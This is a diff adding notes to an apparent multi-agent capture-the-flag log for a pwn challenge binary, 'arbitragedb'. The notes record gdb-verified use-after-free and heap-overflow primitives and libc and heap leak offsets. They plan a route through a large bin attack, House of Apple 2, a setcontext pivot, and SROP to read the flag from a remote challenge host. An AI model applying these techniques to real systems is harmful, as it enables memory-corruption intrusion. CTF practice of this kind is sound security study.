@@ -639,3 +639,59 @@ planner 說「pc_agent 測不到只是因為 SELECT 語法錯」——
 2. varint#2 要 ≥ 0x80 讓截斷發生，才可能 `arg4 != arg5`
 
 → 下次動態測試請**同時**套用這兩點，否則仍可能測不到。
+
+---
+
+## 17. 🟢🔴 linux_agent 動態驗證 + 重大模型修正（2026-09-19，Arch Linux 實跑）
+
+**環境**：Arch Linux，`LD_LIBRARY_PATH=. ./arbitragedb formal_state`（系統 ld 2.44 可載入附件 libc 2.43，
+malloc/heap 全走附件 libc，offset 正確）。gdb 直接 debug（不要用 exec-wrapper，否則 PIE 不重定位）。
+本地 dev 建議 `setarch -R` 關 ASLR：heap=0x55555743c000, libc=0x7ffff7d6b000（固定）。
+pwntools 裝在 scratchpad venv。**gen_poc.py / stage1.py 的參數模型全部作廢，見下。**
+
+### 17.1 真正的 IMPORT 參數模型（gdb 逐暫存器實測 sub_4988）
+- **A** = 第一個 varint（sub_44bb），前進 off。**0x4c43 的 `<=0x80` 檢查是檢查 A**，A 之後未被使用。
+- 接著讀「**同一個 varint V**」兩次（關鍵：sub_4566 **不前進 off**，之後 sub_44bb 才前進 off）：
+  - `B = sub_4566(V)`；單 byte 時 = V，多 byte 時 = `firstbyte & 0x7f`。**恆等於 `C & 0x7f`**。
+  - `C = 完整 LEB128(V)`，**無上限**。
+- 傳進 sub_4604：`alloc = (C&0x7f) + 0x18`（clamp 0x1000），`copylen = min(C, remaining)`，
+  `remaining = size - off`（size ≤ 0x4000）。
+- **UAF 分支 = (B != C)**，只在 V 多 byte 時成立（單 byte ⇒ B==C）。
+- **溢出**：多 byte V 給小 `C&0x7f`（小 alloc）+ 大 C ⇒ memcpy 把 **~0x3fe0 bytes 全可控內容**
+  寫進 `malloc((C&0x7f)+0x18)` 小 chunk。長度 = min(C,remaining) 精確可調（步進 0x80，因低 7 bits 綁 alloc）。
+  例：`C=0x80` → alloc=0x18(0x20 chunk)，`C=0xc0`→alloc=0x58(0x60 chunk) copylen=0xc0。
+
+正確 import 編碼（見 scratchpad/adblib.py）：`ADB1 + 12*\x00 + lv(A) + lv(C) + payload`，
+`IMPORT <name> FORMAT ADB1 SIZE <len>\n<body>`。B 由 binary 自 C 推導，不要自己塞第三個 varint。
+
+### 17.2 已實測成立的原語
+- ✅ **Q1 leak（免溢出）**：UAF import（V 多 byte，B≠C，payload 小到不溢出）→ `SELECT * FROM sys_imports;`
+  - q=malloc(0x520)→0x530 chunk，free 後：單獨在 unsorted ⇒ fd/bk = main_arena（**libc leak**，
+    `libc = leak - 0x212ac8`，低 12 bits 恆 0xac8）；情境使其落 tcache 時 ⇒ mangled fd+key（**heap leak**，
+    `heap = mangled << 12`）。一條連線可同時取得。
+- 分配序（每個 UAF import）：`raw=malloc(bodylen)` → `p=malloc((C&7f)+0x18)` →〔溢出 memcpy〕→
+  `q=malloc(0x520)` → `aux=malloc(0x80)` → `free(q)` → `free(p)`(0x497e) → `free(raw)`(0x4c99)。**aux 不 free（持久）**。
+- **關鍵限制**：p/q/raw 每個寫完都會被 free。所以 **tcache poison 直接寫 libc 會 abort**
+  （free 一個 libc 位址；且 _IO_list_all 附近 libc 全 0，size 欄=0 → free 檢查失敗）。
+  tcache poison 只能拿到「任意 **heap** 寫」（free-safe）。
+
+### 17.3 exploit 路線（free-safe）：large bin attack → _IO_list_all → House of Apple 2
+1. leak libc + heap（17.2）。
+2. **large bin attack**：把一個大 chunk C1 弄進 largebin（free 大 chunk 後，用一個「更大 size 的 raw
+   malloc」掃 unsorted 把它 sort 進 largebin），用**大溢出**改 C1 的 `bk_nextsize = _IO_list_all - 0x20`；
+   再 free 一個「同 largebin index 但較小」的 chunk（可用 raw 控 size），插入時
+   `C1->bk_nextsize->fd_nextsize = victim` ⇒ `*_IO_list_all = &victim`（heap，**不 free 目標**）。
+   → victim 的內容 = 偽 FILE（victim 用 raw buffer，內容 = ADB1 body 可控；注意 free 會蓋掉前 0x20 bytes，
+   偽 FILE 關鍵欄位放在 offset ≥0x20：write_base 0x20/write_ptr 0x28/_wide_data 0xa0/vtable 0xd8/_mode 0xc0）。
+3. exit → `_IO_flush_all` 走 _IO_list_all → House of Apple 2（vtable=`_IO_wfile_jumps` libc+0x211228）
+   → `setcontext+0x3d`(libc+0x4bebd，rdx 版，rsp=[rdx+0xa0] rip=[rdx+0xa8]) → SROP/直接 chain。
+4. ORW：`openat(AT_FDCWD=-100,"/home/arbitragedb/flag",0,0)` → read → write(1)。rt_sigreturn 有開，用 SROP 設暫存器。
+   目標檔 flag 在遠端 `/home/arbitragedb/flag`；遠端 `nc 0.cloud.chals.io 12983`。
+
+**待驗證（grinding 中）**：large bin attack 在 glibc 2.43 的插入檢查點；偽 FILE 前 0x20 被 free 蓋掉的影響；
+setcontext 觸發時 rdx 實際落點。已確認一個 freed 大 chunk 會緊鄰在小溢出-p 上方（可被溢出打到）。
+
+符號 offset（附件 libc 2.43，dynsym 實測）：
+`_IO_list_all=0x213480 _IO_2_1_stdout_=0x213580 _IO_wfile_jumps=0x211228 _IO_file_jumps=0x211030`
+`setcontext=0x4be80(+0x3d=0x4bebd) environ=0x219de8 main_arena=0x212a68`
+gadget（libc）：`pop rdi=0x11bc7a pop rsi=0x5c2e7 pop rax=0xe5dc7 syscall=0xa0be6 ret=0x289fe`；**無 pop rdx**。
